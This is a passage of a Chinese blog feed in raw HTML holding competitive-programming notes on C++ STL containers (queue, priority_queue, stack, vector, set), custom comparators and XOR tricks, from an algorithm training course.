class="hljs-number">50</span> <span class="hljs-number">3</span><br><span class="hljs-number">50</span> <span class="hljs-number">30</span><br></code></pre></div></td></tr></table></figure><p>其中，自定义排序规则的方法还有一种：</p><h4 id="实现二"><a href="#实现二" class="headerlink" title="实现二"></a>实现二</h4><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sq</span>&#123;</span><br><span class="hljs-keyword">int</span> num ,id;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">friend</span> <span class="hljs-keyword">operator</span>&lt;(sq x,sq y)&#123; <span class="hljs-comment">//解释同上面的</span><br><span class="hljs-keyword">if</span>(x.num==y.num)<br><span class="hljs-keyword">return</span> x.id&gt;y.id;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> x.num&gt;y.num;<br>&#125;<br><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">priority_queue</span>&lt;sq&gt; s;<br>sq a;<br>a.id=<span class="hljs-number">10</span>;<br>a.num=<span class="hljs-number">30</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">20</span>;<br>a.num=<span class="hljs-number">40</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">30</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">3</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br><span class="hljs-keyword">int</span> len=s.size();<br><span class="hljs-built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i)&#123;<br>sq t=s.top();<br><span class="hljs-built_in">cout</span>&lt;&lt;t.num&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;t.id&lt;&lt;<span class="hljs-built_in">endl</span>;<br>s.pop();<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">4</span><br><span class="hljs-number">30</span> <span class="hljs-number">10</span><br><span class="hljs-number">40</span> <span class="hljs-number">20</span><br><span class="hljs-number">50</span> <span class="hljs-number">3</span><br><span class="hljs-number">50</span> <span class="hljs-number">30</span><br></code></pre></div></td></tr></table></figure><p>输出的结果都是一样的。</p><h3 id="9-异或的作用"><a href="#9-异或的作用" class="headerlink" title="9.异或的作用"></a>9.异或的作用</h3><blockquote><p><strong>1.对于任何数x，都有x^x=0，x^0=x，同自己求异或为0，同0求异或为自己。</strong><br><strong>2.结合律（即(a^b)^c == a^(b^c)）。</strong><br><strong>3.自反性 A ^ B ^ B = A ^ 0 = A ，连续和同一个因子做异或运算，最终结果为自己。</strong></p></blockquote><h4 id="9-1找出那个唯一落单的数-其他出现两次，唯独它出现一次"><a href="#9-1找出那个唯一落单的数-其他出现两次，唯独它出现一次" class="headerlink" title="9.1找出那个唯一落单的数(其他出现两次，唯独它出现一次)"></a>9.1找出那个唯一落单的数(其他出现两次，唯独它出现一次)</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br>ans^=a[i]; <span class="hljs-comment">//a为存储所有数的数组。</span><br></code></pre></div></td></tr></table></figure><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LCY算法培训-进阶班-第1讲（STL在竞赛中的应用）</title>
    <link href="/2021/03/31/2021%E6%9D%AD%E7%94%B5ACM-LCY%E7%AE%97%E6%B3%95%E5%9F%B9%E8%AE%AD%E8%BF%9B%E9%98%B6%E7%8F%AD/LCY%E7%AE%97%E6%B3%95%E5%9F%B9%E8%AE%AD-%E8%BF%9B%E9%98%B6%E7%8F%AD-%E7%AC%AC1%E8%AE%B2%EF%BC%88STL%E5%9C%A8%E7%AB%9E%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%89/"/>
    <url>/2021/03/31/2021%E6%9D%AD%E7%94%B5ACM-LCY%E7%AE%97%E6%B3%95%E5%9F%B9%E8%AE%AD%E8%BF%9B%E9%98%B6%E7%8F%AD/LCY%E7%AE%97%E6%B3%95%E5%9F%B9%E8%AE%AD-%E8%BF%9B%E9%98%B6%E7%8F%AD-%E7%AC%AC1%E8%AE%B2%EF%BC%88STL%E5%9C%A8%E7%AB%9E%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>2021杭电ACM-LCY算法培训进阶班知识总结。STL在竞赛中的应用PPT内容整理。、、</p><hr><h2 id="知识目录"><a href="#知识目录" class="headerlink" title="知识目录"></a>知识目录</h2><hr><h3 id="相关头文件"><a href="#相关头文件" class="headerlink" title="相关头文件"></a>相关头文件</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;//万能头文件</span></span><br></code></pre></div></td></tr></table></figure><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><hr><h3 id="1-队列-queue"><a href="#1-队列-queue" class="headerlink" title="1.队列(queue)"></a>1.队列(queue)</h3><h6 id="1）特点"><a href="#1）特点" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.先进先出(FIFO)<br>2.从队头删除元素<br>3.在队尾加入元素<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作"><a href="#2）常见操作" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">创建队列对象<br>queue&lt;元素类型&gt; 队列名;<br>queue&lt;int&gt; qq;<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.判断队列是否为空<br>队列名.empty();<br>qq.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.查询队列大小<br>队列名.size();<br>qq.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">3.访问队首元素<br>队列名.front();<br>qq.front();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">4.访问队尾元素<br>队列名.back();<br>qq.back();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">5.加入元素(在队尾加入)<br>队列名.push(元素名);<br>qq.push();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">6.删除元素(在队首删除)<br>队列名.pop();<br>qq.pop();<br></code></pre></div></td></tr></table></figure><h6 id="3）实例"><a href="#3）实例" class="headerlink" title="3）实例"></a>3）实例</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> a,b,c,d;<br><span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; qq;<br>qq.push(<span class="hljs-number">1</span>);<br>qq.push(<span class="hljs-number">3</span>);<br>qq.push(<span class="hljs-number">4</span>);<br>qq.pop();<br>a=qq.front();<span class="hljs-comment">//a=1</span><br>b=qq.back();<span class="hljs-comment">//b=3</span><br>c=qq.size();<span class="hljs-comment">//c=2</span><br>d=qq.empty();<span class="hljs-comment">//d=0</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="2-优先队列-priority-queue"><a href="#2-优先队列-priority-queue" class="headerlink" title="2.优先队列(priority_queue)"></a>2.优先队列(priority_queue)</h3><h6 id="1）特点-1"><a href="#1）特点-1" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.在队尾加入元素<br>2.从队头删除元素<br>3.每次取出的是具有最高优先权的元素(不一定先进先出)<br>4.内部的本质是用堆实现的<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-1"><a href="#2）常见操作-1" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">创建队列对象<br>priority_queue&lt;元素类型&gt; 队列名;<br>priority_queue&lt;int&gt; qq;<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.判断队列是否为空<br>队列名.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.查询队列大小<br>队列名.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">3.返回优先权最高的元素<br>队列名.push();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">4.加入元素<br>队列名.push();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">5.删除元素(删除第一个元素)<br>队列名.pop();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">6.访问最优元素<br>队列名.top();<br></code></pre></div></td></tr></table></figure><h6 id="3）实例-1"><a href="#3）实例-1" class="headerlink" title="3）实例"></a>3）实例</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    <span class="hljs-keyword">int</span> t,a=<span class="hljs-number">2</span>,b=<span class="hljs-number">5</span>,c=<span class="hljs-number">3</span>;<br>    q.push(a); q.push(b); q.push(c);<br>    <span class="hljs-keyword">while</span>(!q.empty())&#123;<br>        t=q.top();<br>        q.pop();<br>        <span class="hljs-built_in">cout</span>&lt;&lt;t&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//printf(&quot;%d\n&quot;,t);</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//结果</span><br><span class="hljs-number">5</span><br><span class="hljs-number">3</span><br><span class="hljs-number">2</span>    <br></code></pre></div></td></tr></table></figure><hr><h3 id="3-栈-stack"><a href="#3-栈-stack" class="headerlink" title="3.栈(stack)"></a>3.栈(stack)</h3><h6 id="1）特点-2"><a href="#1）特点-2" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.先进后出(FILO)<br>2.从栈顶删除元素<br>3.从栈顶加入元素<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-2"><a href="#2）常见操作-2" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs b">创建栈对象<br>stack&lt;元素类型&gt; 栈名;<br>stack&lt;int&gt; st;<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.判断栈是否为空<br>栈名.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.查询栈大小<br>栈名.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>访问栈顶元素 <span class="hljs-comment">//要先确保栈非空</span><br>栈名.top();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">4.栈顶加入元素<br>栈名.push(元素名);<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">5.删除栈顶元素<br>栈名.pop();<br></code></pre></div></td></tr></table></figure><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">栈和队列一样，没有clear之类的函数，如果想要清空一个栈，需要循环调用出栈函数<br></code></pre></div></td></tr></table></figure><h6 id="3）实例-2"><a href="#3）实例-2" class="headerlink" title="3）实例"></a>3）实例</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">stack</span>&lt;<span class="hljs-keyword">int</span>&gt; s;<br>s.push(<span class="hljs-number">1</span>);<br>s.push(<span class="hljs-number">2</span>);<br>s.push(<span class="hljs-number">3</span>);<br>s.pop();<br><span class="hljs-built_in">cout</span>&lt;&lt;s.top()&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//2</span><br>s.top()+=<span class="hljs-number">3</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;s.top()&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//5</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="4-向量，动态数组-vector"><a href="#4-向量，动态数组-vector" class="headerlink" title="4.向量，动态数组(vector)"></a>4.向量，动态数组(vector)</h3><h6 id="1-向量的定义"><a href="#1-向量的定义" class="headerlink" title="1)向量的定义"></a>1)向量的定义</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>&lt;元素类型&gt; 向量名;<br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; a;<br></code></pre></div></td></tr></table></figure><h6 id="2）向量初始化"><a href="#2）向量初始化" class="headerlink" title="2）向量初始化"></a>2）向量初始化</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; abc;<span class="hljs-comment">//初始化一个size为0的vector，也是最常用的</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">abc</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<span class="hljs-comment">//初始化了10个默认值为0的元素</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">abc</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>)</span></span>;<span class="hljs-comment">//初始化了10个值为1的元素</span><br></code></pre></div></td></tr></table></figure><h6 id="3）向量的常见操作"><a href="#3）向量的常见操作" class="headerlink" title="3）向量的常见操作"></a>3）向量的常见操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>取向量首元素的迭代器<br>向量名.begin();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span>取向量尾元素下一地址<br>向量名.end();<span class="hljs-comment">//不是最后一个元素，而是最后一个元素的下一个位置。begin和end可以理解成区间中的前闭后开，即[a.begin,a.end),这个区间包括了向量a中的全部元素</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>取向量首元素的值<br>向量名.front();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>取向量尾元素的值<br>向量名.back();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">5.</span>下标形式访问<br><span class="hljs-keyword">int</span> a=向量名[t];<span class="hljs-comment">//类似普通数组的访问操作，其中t可以为任何数，但不能超出向量中实际的个数</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">6.</span>往尾部添加一个元素<br>向量名.push_back(值);<span class="hljs-comment">//最常见操作</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">7.</span>删除尾部第一个元素<br>向量名.pop_back();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">8.</span>判断向量是否为空<br>向量名.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">9.</span>求向量中元素的个数<br>向量名.size();<span class="hljs-comment">//实际元素的个数，不是容量</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">10.</span>翻转向量<br>reverse(a.begin() , a.end());<span class="hljs-comment">//a为向量名</span><br></code></pre></div></td></tr></table></figure><h6 id="4）向量的经典应用"><a href="#4）向量的经典应用" class="headerlink" title="4）向量的经典应用"></a>4）向量的经典应用</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>邻接表<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">edge</span>&#123;</span><span class="hljs-keyword">int</span> from,to,value;&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> maxn=<span class="hljs-number">1e5</span>;<br><span class="hljs-built_in">vector</span>&lt;edge&gt; Map[maxn];<span class="hljs-comment">//一维向量相当于二维数组</span><br>若用普通二维数组存邻接表，会造成极大浪费(超内存)<br><span class="hljs-comment">//初始化，clear函数是清空向量，不是变成0</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;maxn;++i) Map[i].clear();<br></code></pre></div></td></tr></table></figure><hr><h3 id="5-集合-set"><a href="#5-集合-set" class="headerlink" title="5.集合(set)"></a>5.集合(set)</h3><h6 id="数学上的集合的三个特征"><a href="#数学上的集合的三个特征" class="headerlink" title="数学上的集合的三个特征"></a>数学上的集合的三个特征</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>确定性(任一元素必须是确定属于或不属于某个集合)<br><span class="hljs-number">2.</span>互异性(集合中的元素互不相同)<br><span class="hljs-number">3.</span>无序性(集合中的元素没有先后之分)<br></code></pre></div></td></tr></table></figure><h6 id="1）特点-3"><a href="#1）特点-3" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">set</span>的含义就是集合，是一个有序的，没有相同元素的容器，且里面的元素都是排序好的，支持插入，删除，查找等操作，所有的操作都是严格在logn时间内完成，效率非常高<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-3"><a href="#2）常见操作-3" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">set</span>的声明<br><span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>&gt; s;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span><span class="hljs-built_in">set</span>的清空<br>s.clear();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>插入一个元素x<br>s.insert(x);<span class="hljs-comment">//如果集合中之前没有此元素，则成功插入并自动排序，否则不插入</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 